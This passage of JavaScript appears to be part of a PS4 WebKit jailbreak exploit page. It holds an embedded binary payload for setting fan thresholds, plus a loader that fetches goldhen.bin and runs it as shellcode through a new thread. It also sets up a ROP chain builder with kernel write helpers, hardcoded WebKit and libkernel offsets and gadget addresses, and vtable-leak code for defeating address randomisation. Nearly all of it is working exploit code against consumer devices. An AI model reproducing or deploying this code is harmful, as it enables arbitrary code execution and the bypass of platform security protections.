0, 0, 232, 140, 253, 255, 255, 139, 59, 72, 141, 53, 46, 7, 0, 0, 72, 141, 21, 254, 12, 0, 0, 232, 119, 253, 255, 255, 139, 59, 72, 141, 53, 32, 7, 0, 0, 72, 141, 21, 201, 13, 0, 0, 232, 98, 253, 255, 255, 139, 59, 72, 141, 53, 24, 7, 0, 0, 72, 141, 21, 124, 13, 0, 0, 232, 77, 253, 255, 255, 139, 59, 72, 141, 53, 26, 7, 0, 0, 72, 141, 21, 167, 13, 0, 0, 232, 56, 253, 255, 255, 139, 59, 72, 141, 53, 27, 7, 0, 0, 72, 141, 21, 202, 12, 0, 0, 232, 35, 253, 255, 255, 139, 59, 72, 141, 53, 28, 7, 0, 0, 72, 141, 21, 109, 13, 0, 0, 232, 14, 253, 255, 255, 139, 59, 72, 141, 53, 29, 7, 0, 0, 72, 141, 21, 144, 13, 0, 0, 232, 249, 252, 255, 255, 139, 59, 72, 141, 53, 30, 7, 0, 0, 72, 141, 21, 147, 12, 0, 0, 232, 228, 252, 255, 255, 139, 59, 72, 141, 53, 16, 7, 0, 0, 72, 141, 21, 54, 12, 0, 0, 232, 207, 252, 255, 255, 139, 59, 72, 141, 53, 2, 7, 0, 0, 72, 141, 21, 73, 12, 0, 0, 232, 186, 252, 255, 255, 139, 59, 72, 141, 53, 244, 6, 0, 0, 72, 141, 21, 44, 13, 0, 0, 232, 165, 252, 255, 255, 139, 59, 72, 141, 53, 230, 6, 0, 0, 72, 141, 21, 143, 12, 0, 0, 232, 144, 252, 255, 255, 139, 59, 72, 141, 53, 216, 6, 0, 0, 72, 141, 21, 186, 12, 0, 0, 232, 123, 252, 255, 255, 139, 59, 72, 141, 53, 204, 6, 0, 0, 72, 141, 21, 77, 12, 0, 0, 232, 102, 252, 255, 255, 139, 59, 72, 141, 53, 192, 6, 0, 0, 72, 141, 21, 208, 12, 0, 0, 232, 81, 252, 255, 255, 139, 59, 72, 141, 53, 188, 6, 0, 0, 72, 141, 21, 139, 12, 0, 0, 232, 60, 252, 255, 255, 139, 59, 72, 141, 53, 197, 6, 0, 0, 72, 141, 21, 30, 12, 0, 0, 232, 39, 252, 255, 255, 139, 59, 72, 141, 53, 209, 6, 0, 0, 72, 141, 21, 161, 12, 0, 0, 232, 18, 252, 255, 255, 139, 59, 72, 141, 53, 220, 6, 0, 0, 72, 141, 21, 28, 12, 0, 0, 89, 91, 65, 92, 233, 249, 251, 255, 255, 88, 91, 65, 92, 195, 72, 49, 192, 73, 137, 202, 15, 5, 114, 1, 195, 72, 131, 61, 203, 11, 0, 0, 0, 116, 24, 80, 255, 21, 194, 11, 0, 0, 89, 137, 8, 72, 199, 192, 255, 255, 255, 255, 72, 199, 194, 255, 255, 255, 255, 195, 47, 100, 101, 118, 47, 105, 99, 99, 95, 102, 97, 110, 0, 85, 110, 97, 98, 108, 101, 32, 116, 111, 32, 79, 112, 101, 110, 32, 70, 97, 110, 32, 83, 101, 116, 116, 105, 110, 103, 115, 33, 0, 91, 78, 79, 84, 73, 70, 73, 67, 65, 84, 73, 79, 78, 93, 58, 32, 37, 115, 10, 0, 70, 97, 110, 32, 84, 104, 114, 101, 115, 104, 111, 108, 100, 32, 83, 101, 116, 32, 116, 111, 32, 37, 105, 194, 176, 67, 47, 37, 105, 194, 176, 70, 33, 0, 99, 120, 109, 108, 58, 47, 47, 112, 115, 110, 111, 116, 105, 102, 105, 99, 97, 116, 105, 111, 110, 47, 116, 101, 120, 95, 105, 99, 111, 110, 95, 115, 121, 115, 116, 101, 109, 0, 85, 110, 115, 117, 112, 112, 111, 114, 116, 101, 100, 32, 102, 105, 114, 109, 119, 97, 114, 101, 0, 0, 144, 239, 255, 255, 144, 239, 255, 255, 144, 239, 255, 255, 144, 239, 255, 255, 192, 238, 255, 255, 192, 238, 255, 255, 15, 241, 255, 255, 15, 241, 255, 255, 15, 241, 255, 255, 224, 238, 255, 255, 0, 239, 255, 255, 32, 239, 255, 255, 123, 239, 255, 255, 123, 239, 255, 255, 239, 240, 255, 255, 155, 239, 255, 255, 239, 240, 255, 255, 155, 239, 255, 255, 239, 240, 255, 255, 155, 239, 255, 255, 47, 117, 115, 101, 114, 47, 46, 106, 97, 105, 108, 98, 114, 101, 97, 107, 0, 47, 37, 115, 47, 99, 111, 109, 109, 111, 110, 47, 108, 105, 98, 47, 108, 105, 98, 99, 46, 115, 112, 114, 120, 0, 47, 115, 121, 115, 116, 101, 109, 47, 99, 111, 109, 109, 111, 110, 47, 108, 105, 98, 47, 108, 105, 98, 99, 46, 115, 112, 114, 120, 0, 37, 48, 50, 108, 120, 37, 48, 50, 108, 120, 0, 47, 115, 121, 115, 116, 101, 109, 47, 99, 111, 109, 109, 111, 110, 47, 108, 105, 98, 47, 108, 105, 98, 83, 99, 101, 83, 121, 115, 85, 116, 105, 108, 46, 115, 112, 114, 120, 0, 115, 99, 101, 83, 121, 115, 85, 116, 105, 108, 83, 101, 110, 100, 83, 121, 115, 116, 101, 109, 78, 111, 116, 105, 102, 105, 99, 97, 116, 105, 111, 110, 87, 105, 116, 104, 84, 101, 120, 116, 0, 47, 115, 121, 115, 116, 101, 109, 47, 99, 111, 109, 109, 111, 110, 47, 108, 105, 98, 47, 108, 105, 98, 83, 99, 101, 83, 121, 115, 116, 101, 109, 83, 101, 114, 118, 105, 99, 101, 46, 115, 112, 114, 120, 0, 115, 99, 101, 83, 121, 115, 116, 101, 109, 83, 101, 114, 118, 105, 99, 101, 76, 97, 117, 110, 99, 104, 87, 101, 98, 66, 114, 111, 119, 115, 101, 114, 0, 108, 105, 98, 83, 99, 101, 76, 105, 98, 99, 73, 110, 116, 101, 114, 110, 97, 108, 46, 115, 112, 114, 120, 0, 109, 97, 108, 108, 111, 99, 0, 102, 114, 101, 101, 0, 99, 97, 108, 108, 111, 99, 0, 114, 101, 97, 108, 108, 111, 99, 0, 109, 101, 109, 97, 108, 105, 103, 110, 0, 109, 101, 109, 115, 101, 116, 0, 109, 101, 109, 99, 112, 121, 0, 109, 101, 109, 99, 109, 112, 0, 109, 101, 109, 109, 111, 118, 101, 0, 109, 101, 109, 109, 111, 118, 101, 95, 115, 0, 115, 116, 114, 99, 112, 121, 0, 115, 116, 114, 110, 99, 112, 121, 0, 115, 116, 114, 110, 99, 112, 121, 95, 115, 0, 115, 116, 114, 99, 97, 116, 0, 115, 116, 114, 110, 99, 97, 116, 0, 115, 116, 114, 108, 101, 110, 0, 115, 116, 114, 99, 109, 112, 0, 115, 116, 114, 110, 99, 109, 112, 0, 115, 112, 114, 105, 110, 116, 102, 0, 115, 110, 112, 114, 105, 110, 116, 102, 0, 115, 110, 112, 114, 105, 110, 116, 102, 95, 115, 0, 115, 115, 99, 97, 110, 102, 0, 115, 116, 114, 116, 111, 108, 0, 115, 116, 114, 116, 111, 107, 0, 115, 116, 114, 99, 104, 114, 0, 115, 116, 114, 114, 99, 104, 114, 0, 115, 116, 114, 115, 116, 114, 0, 115, 116, 114, 100, 117, 112, 0, 114, 105, 110, 100, 101, 120, 0, 105, 115, 100, 105, 103, 105, 116, 0, 97, 116, 111, 105, 0, 97, 116, 111, 102, 0, 115, 116, 114, 108, 99, 112, 121, 0, 115, 116, 114, 101, 114, 114, 111, 114, 0, 95, 71, 101, 116, 112, 99, 116, 121, 112, 101, 0, 95, 83, 116, 111, 117, 108, 0, 98, 99, 111, 112, 121, 0, 115, 114, 97, 110, 100, 0, 97, 115, 99, 116, 105, 109, 101, 0, 97, 115, 99, 116, 105, 109, 101, 95, 114, 0, 103, 109, 116, 105, 109, 101, 0, 103, 109, 116, 105, 109, 101, 95, 115, 0, 108, 111, 99, 97, 108, 116, 105, 109, 101, 0, 108, 111, 99, 97, 108, 116, 105, 109, 101, 95, 114, 0, 109, 107, 116, 105, 109, 101, 0, 111, 112, 101, 110, 100, 105, 114, 0, 114, 101, 97, 100, 100, 105, 114, 0, 114, 101, 97, 100, 100, 105, 114, 95, 114, 0, 116, 101, 108, 108, 100, 105, 114, 0, 115, 101, 101, 107, 100, 105, 114, 0, 114, 101, 119, 105, 110, 100, 100, 105, 114, 0, 99, 108, 111, 115, 101, 100, 105, 114, 0, 100, 105, 114, 102, 100, 0, 103, 101, 116, 112, 114, 111, 103, 110, 97, 109, 101, 0, 102, 111, 112, 101, 110, 0, 102, 114, 101, 97, 100, 0, 102, 119, 114, 105, 116, 101, 0, 102, 115, 101, 101, 107, 0, 102, 116, 101, 108, 108, 0, 102, 99, 108, 111, 115, 101, 0, 102, 112, 114, 105, 110, 116, 102, 0, 108, 105, 98, 107, 101, 114, 110, 101, 108, 46, 115, 112, 114, 120, 0, 108, 105, 98, 107, 101, 114, 110, 101, 108, 95, 119, 101, 98, 46, 115, 112, 114, 120, 0, 108, 105, 98, 107, 101, 114, 110, 101, 108, 95, 115, 121, 115, 46, 115, 112, 114, 120, 0, 95, 95, 115, 116, 97, 99, 107, 95, 99, 104, 107, 95, 103, 117, 97, 114, 100, 0, 95, 95, 115, 116, 97, 99, 107, 95, 99, 104, 107, 95, 102, 97, 105, 108, 0, 95, 95, 101, 114, 114, 111, 114, 0, 115, 99, 101, 75, 101, 114, 110, 101, 108, 69, 114, 114, 111, 114, 0, 115, 99, 101, 75, 101, 114, 110, 101, 108, 76, 111, 97, 100, 83, 116, 97, 114, 116, 77, 111, 100, 117, 108, 101, 0, 115, 99, 101, 75, 101, 114, 110, 101, 108, 65, 108, 108, 111, 99, 97, 116, 101, 68, 105, 114, 101, 99, 116, 77, 101, 109, 111, 114, 121, 0, 115, 99, 101, 75, 101, 114, 110, 101, 108, 77, 97, 112, 68, 105, 114, 101, 99, 116, 77, 101, 109, 111, 114, 121, 0, 115, 99, 101, 75, 101, 114, 110, 101, 108, 71, 101, 116, 68, 105, 114, 101, 99, 116, 77, 101, 109, 111, 114, 121, 83, 105, 122, 101, 0, 115, 99, 101, 75, 101, 114, 110, 101, 108, 83, 116, 97, 116, 0, 115, 99, 101, 75, 101, 114, 110, 101, 108, 79, 112, 101, 110, 0, 115, 99, 101, 75, 101, 114, 110, 101, 108, 82, 101, 97, 100, 0, 115, 99, 101, 75, 101, 114, 110, 101, 108, 76, 115, 101, 101, 107, 0, 115, 99, 101, 75, 101, 114, 110, 101, 108, 67, 108, 111, 115, 101, 0, 115, 99, 101, 75, 101, 114, 110, 101, 108, 83, 108, 101, 101, 112, 0, 115, 99, 101, 75, 101, 114, 110, 101, 108, 85, 115, 108, 101, 101, 112, 0, 115, 99, 101, 75, 101, 114, 110, 101, 108, 71, 101, 116, 116, 105, 109, 101, 111, 102, 100, 97, 121, 0, 115, 99, 101, 75, 101, 114, 110, 101, 108, 71, 101, 116, 80, 114, 111, 99, 101, 115, 115, 84, 105, 109, 101, 0, 115, 99, 101, 75, 101, 114, 110, 101, 108, 71, 101, 116, 67, 117, 114, 114, 101, 110, 116, 67, 112, 117, 0, 115, 121, 115, 99, 116, 108, 0, 115, 121, 115, 99, 116, 108, 98, 121, 110, 97, 109, 101, 0, 115, 121, 115, 97, 114, 99, 104, 0, 101, 120, 101, 99, 118, 101, 0, 112, 116, 104, 114, 101, 97, 100, 95, 115, 101, 108, 102, 0, 112, 116, 104, 114, 101, 97, 100, 95, 115, 101, 116, 97, 102, 102, 105, 110, 105, 116, 121, 95, 110, 112, 0, 115, 99, 101, 75, 101, 114, 110, 101, 108, 67, 114, 101, 97, 116, 101, 69, 113, 117, 101, 117, 101, 0, 115, 99, 101, 75, 101, 114, 110, 101, 108, 68, 101, 108, 101, 116, 101, 69, 113, 117, 101, 117, 101, 0, 115, 99, 101, 75, 101, 114, 110, 101, 108, 65, 100, 100, 85, 115, 101, 114, 69, 118, 101, 110, 116, 0, 115, 99, 101, 75, 101, 114, 110, 101, 108, 65, 100, 100, 82, 101, 97, 100, 69, 118, 101, 110, 116, 0, 103, 101, 116, 117, 105, 100, 0, 103, 101, 116, 103, 105, 100, 0, 103, 101, 116, 112, 105, 100, 0, 115, 101, 116, 117, 105, 100, 0, 115, 101, 116, 103, 105, 100, 0, 115, 101, 116, 114, 101, 117, 105, 100, 0, 115, 101, 116, 114, 101, 103, 105, 100, 0, 115, 99, 101, 75, 101, 114, 110, 101, 108, 71, 101, 116, 73, 100, 80, 115, 0, 115, 99, 101, 75, 101, 114, 110, 101, 108, 71, 101, 116, 79, 112, 101, 110, 80, 115, 73, 100, 70, 111, 114, 83, 121, 115, 116, 101, 109, 0, 115, 99, 101, 75, 101, 114, 110, 101, 108, 83, 101, 110, 100, 78, 111, 116, 105, 102, 105, 99, 97, 116, 105, 111, 110, 82, 101, 113, 117, 101, 115, 116, 0, 115, 99, 101, 75, 101, 114, 110, 101, 108, 71, 101, 116, 70, 115, 83, 97, 110, 100, 98, 111, 120, 82, 97, 110, 100, 111, 109, 87, 111, 114, 100, 0, 115, 99, 101, 75, 101, 114, 110, 101, 108, 71, 101, 116, 83, 121, 115, 116, 101, 109, 83, 119, 86, 101, 114, 115, 105, 111, 110, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 245, 254, 255, 111, 0, 0, 0, 0, 16, 28, 0, 0, 0, 0, 0, 0, 5, 0, 0, 0, 0, 0, 0, 0, 8, 28, 0, 0, 0, 0, 0, 0, 6, 0, 0, 0, 0, 0, 0, 0, 240, 27, 0, 0, 0, 0, 0, 0, 10, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 11, 0, 0, 0, 0, 0, 0, 0, 24, 0, 0, 0, 0, 0, 0, 0, 21, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 30, 0, 0, 0, 0, 0, 0, 0, 8, 0, 0, 0, 0, 0, 0, 0, 251, 255, 255, 111, 0, 0, 0, 0, 1, 0, 0, 8, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1 * tempc(), 0, 0, 0, 255, 255, 255, 255];
		var payload_buffer = chain.syscall(477, 0, payload.length, 7, 0x1002, -1, 0);
		var buf = new Uint8Array(1);
		var buf_addr = p.leakval(buf);
		var old_buf = p.read8(buf_addr.add32(16));
		var old_sz = p.read4(buf_addr.add32(24));
		p.write8(buf_addr.add32(16), payload_buffer);
		p.write4(buf_addr.add32(24), payload.length);
		for(var i = 0; i < payload.length; i++) buf[i] = payload[i];
		p.write8(buf_addr.add32(16), old_buf);
		p.write4(buf_addr.add32(24), old_sz);
		var pthread = p.malloc(0x10);
		chain.call(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_buffer, 0);
		showMessage("Fan Threshold Set.");
	}

	function injectPayload() //dynamic payload inject - stooged
	{
		showMessage("Loading Goldhen");
		bar.style.width = "66%";
		var req = new XMLHttpRequest();
		req.responseType = "arraybuffer";
		req.open('GET', 'goldhen.bin');
		req.send();
		req.onreadystatechange = function() {
			if(req.readyState == 4) {
				PLD = req.response;
				var payload_buffer = chain.syscall(477, 0, PLD.byteLength * 4, 7, 0x1002, -1, 0);
				var pl = p.array_from_address(payload_buffer, PLD.byteLength * 4);
				var padding = new Uint8Array(4 - (req.response.byteLength % 4) % 4);
				var tmp = new Uint8Array(req.response.byteLength + padding.byteLength);
				tmp.set(new Uint8Array(req.response), 0);
				tmp.set(padding, req.response.byteLength);
				var shellcode = new Uint32Array(tmp.buffer);
				pl.set(shellcode, 0);
				var pthread = p.malloc(0x10);
				chain.call(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_buffer, 0);
				bar.style.width = "100%";
				showMessage("Done");
				setTimeout(ShutDown, 3000);
			}
		};
	}

	function sleep(ms) {
		return new Promise(resolve => setTimeout(resolve, ms));
	}

	function int64(low, hi) {
		this.low = (low >>> 0);
		this.hi = (hi >>> 0);
		this.add32inplace = function(val) {
			var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
			var new_hi = (this.hi >>> 0);
			if(new_lo < this.low) {
				new_hi++;
			}
			this.hi = new_hi;
			this.low = new_lo;
		}
		this.add32 = function(val) {
			var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
			var new_hi = (this.hi >>> 0);
			if(new_lo < this.low) {
				new_hi++;
			}
			return new int64(new_lo, new_hi);
		}
		this.sub32 = function(val) {
			var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
			var new_hi = (this.hi >>> 0);
			if(new_lo > (this.low) & 0xFFFFFFFF) {
				new_hi--;
			}
			return new int64(new_lo, new_hi);
		}
		this.sub32inplace = function(val) {
			var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
			var new_hi = (this.hi >>> 0);
			if(new_lo > (this.low) & 0xFFFFFFFF) {
				new_hi--;
			}
			this.hi = new_hi;
			this.low = new_lo;
		}
		this.and32 = function(val) {
			var new_lo = this.low & val;
			var new_hi = this.hi;
			return new int64(new_lo, new_hi);
		}
		this.and64 = function(vallo, valhi) {
			var new_lo = this.low & vallo;
			var new_hi = this.hi & valhi;
			return new int64(new_lo, new_hi);
		}
		this.toString = function(val) {
			val = 16;
			var lo_str = (this.low >>> 0).toString(val);
			var hi_str = (this.hi >>> 0).toString(val);
			if(this.hi == 0) return lo_str;
			else lo_str = zeroFill(lo_str, 8)
			return hi_str + lo_str;
		}
		return this;
	}

	function zeroFill(number, width) {
		width -= number.toString().length;
		if(width > 0) {
			return new Array(width + (/\./.test(number) ? 2 : 1)).join('0') + number;
		}
		return number + ""; // always return a string
	}

	function zeroFill(number, width) {
		width -= number.toString().length;
		if(width > 0) {
			return new Array(width + (/\./.test(number) ? 2 : 1)).join('0') + number;
		}
		return number + ""; // always return a string
	}
	const stack_sz = 0x40000;
	const reserve_upper_stack = 0x10000;
	const stack_reserved_idx = reserve_upper_stack / 4;
	// Class for quickly creating and managing a ROP chain
	window.rop = function() {
		this.stackback = p.malloc32(stack_sz / 4 + 0x8);
		this.stack = this.stackback.add32(reserve_upper_stack);
		this.stack_array = this.stackback.backing;
		this.retval = this.stackback.add32(stack_sz);
		this.count = 1;
		this.branches_count = 0;
		this.branches_rsps = p.malloc(0x200);
		this.clear = function() {
			this.count = 1;
			this.branches_count = 0;
			for(var i = 1; i < ((stack_sz / 4) - stack_reserved_idx); i++) {
				this.stack_array[i + stack_reserved_idx] = 0;
			}
		};
		this.pushSymbolic = function() {
			this.count++;
			return this.count - 1;
		}
		this.finalizeSymbolic = function(idx, val) {
			if(val instanceof int64) {
				this.stack_array[stack_reserved_idx + idx * 2] = val.low;
				this.stack_array[stack_reserved_idx + idx * 2 + 1] = val.hi;
			} else {
				this.stack_array[stack_reserved_idx + idx * 2] = val;
				this.stack_array[stack_reserved_idx + idx * 2 + 1] = 0;
			}
		}
		this.push = function(val) {
			this.finalizeSymbolic(this.pushSymbolic(), val);
		}
		this.push_write8 = function(where, what) {
			this.push(gadgets["pop rdi"]);
			this.push(where);
			this.push(gadgets["pop rsi"]);
			this.push(what);
			this.push(gadgets["mov [rdi], rsi"]);
		}
		this.fcall = function(rip, rdi, rsi, rdx, rcx, r8, r9) {
			if(rdi != undefined) {
				this.push(gadgets["pop rdi"]);
				this.push(rdi);
			}
			if(rsi != undefined) {
				this.push(gadgets["pop rsi"]);
				this.push(rsi);
			}
			if(rdx != undefined) {
				this.push(gadgets["pop rdx"]);
				this.push(rdx);
			}
			if(rcx != undefined) {
				this.push(gadgets["pop rcx"]);
				this.push(rcx);
			}
			if(r8 != undefined) {
				this.push(gadgets["pop r8"]);
				this.push(r8);
			}
			if(r9 != undefined) {
				this.push(gadgets["pop r9"]);
				this.push(r9);
			}
			if(this.stack.add32(this.count * 0x8).low & 0x8) {
				this.push(gadgets["ret"]);
			}
			this.push(rip);
			return this;
		}
		this.call = function(rip, rdi, rsi, rdx, rcx, r8, r9) {
			this.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
			this.write_result(this.retval);
			this.run();
			return p.read8(this.retval);
		}
		this.syscall = function(sysc, rdi, rsi, rdx, rcx, r8, r9) {
			return this.call(window.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
		}
		//get rsp of the next push
		this.get_rsp = function() {
			return this.stack.add32(this.count * 8);
		}
		this.write_result = function(where) {
			this.push(gadgets["pop rdi"]);
			this.push(where);
			this.push(gadgets["mov [rdi], rax"]);
		}
		this.write_result4 = function(where) {
			this.push(gadgets["pop rdi"]);
			this.push(where);
			this.push(gadgets["mov [rdi], eax"]);
		}
		this.jmp_rsp = function(rsp) {
			this.push(window.gadgets["pop rsp"]);
			this.push(rsp);
		}
		this.run = function() {
			p.launch_chain(this);
			this.clear();
		}
		this.KERNEL_BASE_PTR_VAR;
		this.set_kernel_var = function(arg) {
			this.KERNEL_BASE_PTR_VAR = arg;
		}
		this.rax_kernel = function(offset) {
			this.push(gadgets["pop rax"]);
			this.push(this.KERNEL_BASE_PTR_VAR)
			this.push(gadgets["mov rax, [rax]"]);
			this.push(gadgets["pop rsi"]);
			this.push(offset)
			this.push(gadgets["add rax, rsi"]);
		}
		this.write_kernel_addr_to_chain_later = function(offset) {
			this.push(gadgets["pop rdi"]);
			var idx = this.pushSymbolic();
			this.rax_kernel(offset);
			this.push(gadgets["mov [rdi], rax"]);
			return idx;
		}
		this.kwrite8 = function(offset, qword) {
			this.rax_kernel(offset);
			this.push(gadgets["pop rsi"]);
			this.push(qword);
			this.push(gadgets["mov [rax], rsi"]);
		}
		this.kwrite4 = function(offset, dword) {
			this.rax_kernel(offset);
			this.push(gadgets["pop rdx"]);
			this.push(dword);
			this.push(gadgets["mov [rax], edx"]);
		}
		this.kwrite2 = function(offset, word) {
			this.rax_kernel(offset);
			this.push(gadgets["pop rcx"]);
			this.push(word);
			this.push(gadgets["mov [rax], cx"]);
		}
		this.kwrite1 = function(offset, byte) {
			this.rax_kernel(offset);
			this.push(gadgets["pop rcx"]);
			this.push(byte);
			this.push(gadgets["mov [rax], cl"]);
		}
		this.kwrite8_kaddr = function(offset1, offset2) {
			this.rax_kernel(offset2);
			this.push(gadgets["mov rdx, rax"]);
			this.rax_kernel(offset1);
			this.push(gadgets["mov [rax], rdx"]);
		}
		return this;
	};
	var chain;
	var kchain;
	var kchain2;
	var SAVED_KERNEL_STACK_PTR;
	var KERNEL_BASE_PTR;
	var webKitBase;
	var webKitRequirementBase;
	var libSceLibcInternalBase;
	var libKernelBase;
	var textArea = document.createElement("textarea");
	const OFFSET_wk_vtable_first_element = 0x104F110;
	const OFFSET_WK_memset_import = 0x000002A8;
	const OFFSET_WK___stack_chk_fail_import = 0x00000178;
	const OFFSET_WK_psl_builtin_import = 0xD68;
	const OFFSET_WKR_psl_builtin = 0x33BA0;
	const OFFSET_WK_setjmp_gadget_one = 0x0106ACF7;
	const OFFSET_WK_setjmp_gadget_two = 0x01ECE1D3;
	const OFFSET_WK_longjmp_gadget_one = 0x0106ACF7;
	const OFFSET_WK_longjmp_gadget_two = 0x01ECE1D3;
	const OFFSET_libcint_memset = 0x0004F810;
	const OFFSET_libcint_setjmp = 0x000BB5BC;
	const OFFSET_libcint_longjmp = 0x000BB616;
	const OFFSET_WK2_TLS_IMAGE = 0x38e8020;
	const OFFSET_lk___stack_chk_fail = 0x0001FF60;
	const OFFSET_lk_pthread_create = 0x00025510;
	const OFFSET_lk_pthread_join = 0x0000AFA0;
	var nogc = [];
	var syscalls = {};
	var gadgets = {};
	var wk_gadgetmap = {
		"ret": 0x32,
		"pop rdi": 0x319690,
		"pop rsi": 0x1F4D6,
		"pop rdx": 0x986C,
		"pop rcx": 0x657B7,
		"pop r8": 0xAFAA71,
		"pop r9": 0x422571,
		"pop rax": 0x51A12,
		"pop rsp": 0x4E293,
		"mov [rdi], rsi": 0x1A97920,
		"mov [rdi], rax": 0x10788F7,
		"mov [rdi], eax": 0x9964BC,
		"cli ; pop rax": 0x566F8,
		"sti": 0x1FBBCC,
		"mov rax, [rax]": 0x241CC,
		"mov rax, [rsi]": 0x5106A0,
		"mov [rax], rsi": 0x1EFD890,
		"mov [rax], rdx": 0x1426A82,
		"mov [rax], edx": 0x3B7FE4,
		"add rax, rsi": 0x170397E,
		"mov rdx, rax": 0x53F501,
		"add rax, rcx": 0x2FBCD,
		"mov rsp, rdi": 0x2048062,
		"mov rdi, [rax + 8] ; call [rax]": 0x751EE7,
		"infloop": 0x7DFF,
		"mov [rax], cl": 0xC6EAF,
	};
	var wkr_gadgetmap = {
		"xchg rdi, rsp ; call [rsi - 0x79]": 0x1d74f0 //JOP 3
	};
	var wk2_gadgetmap = {
		"mov [rax], rdi": 0xFFDD7,
		"mov [rax], rcx": 0x2C9ECA,
		"mov [rax], cx": 0x15A7D52,
	};
	var hmd_gadgetmap = {
		"add [r8], r12": 0x2BCE1
	};
	var ipmi_gadgetmap = {
		"mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]": 0x344B
	};

	function userland() {
		//RW -> ROP method is strongly based off of:
		//https://github.com/Cryptogenic/PS4-6.20-WebKit-Code-Execution-Exploit
		p.launch_chain = launch_chain;
		p.malloc = malloc;
		p.malloc32 = malloc32;
		p.stringify = stringify;
		p.array_from_address = array_from_address;
		p.readstr = readstr;
		//pointer to vtable address
		var textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
		//address of vtable
		var textAreaVtable = p.read8(textAreaVtPtr);
		//use address of 1st entry (in .text) to calculate webkitbase
		webKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);
		libSceLibcInternalBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_memset_import)));
		libSceLibcInternalBase.sub32inplace(OFFSET_libcint_memset);
		libKernelBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK___stack_chk_fail_import)));
		libKernelBase.sub32inplace(OFFSET_lk___stack_chk_fail);
		webKitRequirementBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_psl_builtin_import)));
		webKitRequirementBase.sub32inplace(OFFSET_WKR_psl_builtin);
		for(var gadget in wk_gadgetmap) {
			window.gadgets[gadget] = webKitBase.add32(wk_gadgetmap[gadget]);
		}
		for(var gadget in wkr_gadgetmap) {
			window.gadgets[gadget] = webKitRequirementBase.add32(wkr_gadgetmap[gadget]);
		}

		function get_jmptgt(address) {
			var instr = p.read4(address) & 0xFFFF;
			var offset = p.read4(address.add32(2));
			if(instr != 0x25FF) {
				return 0;
			}
			return address.add32(0x6 + offset);
		}

		function malloc(sz) {
			var backing = new Uint8Array(0x10000 + sz);
			window.nogc.push(backing);
			var ptr = p.read8(p.leakval(backing).add32(0x10));
			ptr.backing = backing;
			return ptr;
		}

		function malloc32(sz) {
			var backing = new Uint8Array(0x10000 + sz * 4);
			window.nogc.push(backing);
			var ptr = p.read8(p.leakval(backing).add32(0x10));
			ptr.backing = new Uint32Array(backing.buffer);
			return ptr;
		}

		function array_from_address(addr, size) {
			var og_array = new Uint32Array(0x1000);
			var og_array_i = p.leakval(og_array).add32(0x10);
			p.write8(og_array_i, addr);
			p.write4(og_array_i.add32(0x8), size);
			p.write4(og_array_i.add32(0xC), 0x1);
			nogc.push(og_array);
			return og_array;
		}

		function stringify(str) {
			var bufView = new Uint8Array(str.length + 1);
			for(var i = 0; i < str.length; i++) {
				bufView[i] = str.charCodeAt(i) & 0xFF;
			}
			window.nogc.push(bufView);
			return p.read8(p.leakval(bufView).add32(0x10));
		}

		function readstr(addr) {
			var str = "";
			for(var i = 0;; i++) {
				var c = p.read1(addr.add32(i));
				if(c == 0x0) {
					break;
				}
				str += String.fromCharCode(c);
			}
			return str;
		}
		var fakeVtable_setjmp = p.malloc32(0x200);
		var fakeVtable_longjmp = p.malloc32(0x200);
		var original_context = p.malloc32(0x40);
		var modified_context = p.malloc32(0x40);
		p.write8(fakeVtable_setjmp.add32(0x0), fakeVtable_setjmp);
		p.write8(fakeVtable_setjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_setjmp_gadget_two)); // mov rdi, qword ptr [rdi + 0x10] ; jmp qword ptr [rax + 8]
		p.write8(fakeVtable_setjmp.add32(0x10), original_context);
		p.write8(fakeVtable_setjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_setjmp));
		p.write8(fakeVtable_setjmp.add32(0x1C8), webKitBase.add32(OFFSET_WK_setjmp_gadget_one)); // mov rax, qword ptr [rcx]; mov rdi, rcx; jmp qword ptr [rax + 0xA8]
		p.write8(fakeVtable_longjmp.add32(0x0), fakeVtable_longjmp);
		p.write8(fakeVtable_longjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_longjmp_gadget_two)); // mov rdi, qword ptr [rdi + 0x10] ; jmp qword ptr [rax + 8]
		p.write8(fakeVtable_longjmp.add32(0x10), modified_context);
		p.write8(fakeVtable_longjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));
